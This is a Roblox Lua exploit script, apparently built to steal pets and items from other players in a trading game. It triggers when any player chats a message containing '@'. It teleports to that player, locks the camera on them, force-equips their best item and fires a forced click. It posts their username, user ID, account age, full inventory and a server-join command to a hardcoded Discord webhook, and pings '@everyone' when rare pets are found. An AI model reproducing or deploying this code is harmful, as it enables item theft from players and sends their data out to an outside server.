local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"

local RARE_PETS = {
    ["T-Rex"] = true,
    ["Dragonfly"] = true,
    ["Raccoon"] = true,
    ["Mimic Octopus"] = true,
    ["Butterfly"] = true,
    ["Disco bee"] = true,
    ["Queen bee"] = true
}

-- Mouse click function
local function mouse1click()
    local mouse = LocalPlayer:GetMouse()
    for _,v in next, getconnections(mouse.Button1Down) do
        v:Fire()
    end
end

-- Force first person view
local function setFirstPerson()
    LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
    LocalPlayer.CameraMaxZoomDistance = 0.5
    LocalPlayer.CameraMinZoomDistance = 0.5
end

-- Look at target's head
local function lookAtTarget(targetHead)
    local camera = Workspace.CurrentCamera
    local conn
    conn = RunService.Heartbeat:Connect(function()
        if targetHead and camera then
            camera.CFrame = CFrame.new(camera.CFrame.p, targetHead.Position)
        else
            if conn then conn:Disconnect() end
        end
    end)
    return conn
end

-- Send data to webhook
local function sendToWebhook(data)
    local placeId = game.PlaceId
    local jobId = game.JobId
    local teleportScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', placeId, jobId)
    
    local hasRarePet = false
    for petName in pairs(RARE_PETS) do
        if string.find(data.items, petName) then
            hasRarePet = true
            break
        end
    end

    local embed = {
        ["title"] = "Roqate - 2025",
        ["description"] = "Target Information",
        ["color"] = 0xFF0000,
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = data.username,
                ["inline"] = true
            },
            {
                ["name"] = "UserID",
                ["value"] = tostring(data.userId),
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = tostring(data.accountAge),
                ["inline"] = true
            },
            {
                ["name"] = "Items",
                ["value"] = data.items,
                ["inline"] = false
            }
        }
    }

    local payload = {
        ["content"] = (hasRarePet and "@everyone\n" or "")..teleportScript,
        ["embeds"] = {embed}
    }

    local jsonPayload = HttpService:JSONEncode(payload)
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, jsonPayload)
    end)
end

-- Get best item from backpack
local function getBestItem(backpack)
    local bestItem = nil
    local bestValue = 0
    local bestWeight = 0
    local isPet = false

    for _, tool in ipairs(backpack:GetChildren()) do
        local itemName = tool.Name
        local petMatch = string.match(itemName, "([%w%s]+) %[%d+%.%d+ KG%] %[Age %d+%]")
        local itemMatch = string.match(itemName, "%[([%w%s]+)%] ([%w%s]+) %[%d+%.%d+kg%]")

        if petMatch then
            local petName = petMatch
            local weight = tonumber(string.match(itemName, "%[(%d+%.%d+) KG%]")) or 0
            local rarityValue = RARE_PETS[petName] and 1000 or 100

            if rarityValue > bestValue or (rarityValue == bestValue and weight > bestWeight) then
                bestValue = rarityValue
                bestWeight = weight
                bestItem = tool
                isPet = true
            end
        elseif itemMatch then
            local rarity, name = string.match(itemName, "%[([%w%s]+)%] ([%w%s]+) %[%d+%.%d+kg%]")
            local weight = tonumber(string.match(itemName, "%[(%d+%.%d+)kg%]")) or 0
            local rarityValue = 0

            if rarity == "Disco" then rarityValue = 50
            elseif rarity == "Wet" then rarityValue = 40
            else rarityValue = 10 end

            if not isPet and (rarityValue > bestValue or (rarityValue == bestValue and weight > bestWeight)) then
                bestValue = rarityValue
                bestWeight = weight
                bestItem = tool
            end
        end
    end

    return bestItem
end

-- Main interaction function
local function teleportAndInteract(target)
    -- Get characters
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local rootPart = character:WaitForChild("HumanoidRootPart")

    -- Get target character
    local targetCharacter = target.Character or target.CharacterAdded:Wait()
    local targetHead = targetCharacter:WaitForChild("Head")
    local targetTorso = targetCharacter:FindFirstChild("UpperTorso") or targetCharacter:FindFirstChild("Torso")

    -- Teleport to target
    rootPart.CFrame = targetTorso.CFrame * CFrame.new(0, 0, -4)

    -- Set first person and look at target
    setFirstPerson()
    local lookConn = lookAtTarget(targetHead)

    -- Force equip best item
    local backpack = target:FindFirstChild("Backpack")
    if backpack and targetCharacter:FindFirstChild("Humanoid") then
        local bestItem = getBestItem(backpack)
        if bestItem then
            targetCharacter.Humanoid:EquipTool(bestItem)
        end
    end

    -- Send webhook data
    local items = {}
    if backpack then
        for _, tool in ipairs(backpack:GetChildren()) do
            table.insert(items, tool.Name)
        end
    end

    local data = {
        username = target.Name,
        userId = target.UserId,
        accountAge = target.AccountAge,
        items = #items > 0 and table.concat(items, "\n") or "No items found"
    }
    
    sendToWebhook(data)

    -- Force click after delay
    task.wait(0.5)
    pcall(function()
        UserInputService:SetMouseLocation(0.5, 0.5)
        mouse1click()
    end)

    -- Wait and cleanup
    task.wait(5)
    if lookConn then lookConn:Disconnect() end
end

-- Chat detection
local function onPlayerChatted(player, message)
    if player == LocalPlayer then return end
    if not string.find(message, "@") then return end

    -- Run in a coroutine to avoid yielding errors
    coroutine.wrap(function()
        local success, err = pcall(function()
            teleportAndInteract(player)
        end)
        if not success then
            warn("Error: "..err)
        end
    end)()
end

-- Set up chat listeners
for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(message)
            onPlayerChatted(player, message)
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(message)
            onPlayerChatted(player, message)
        end)
    end
end)
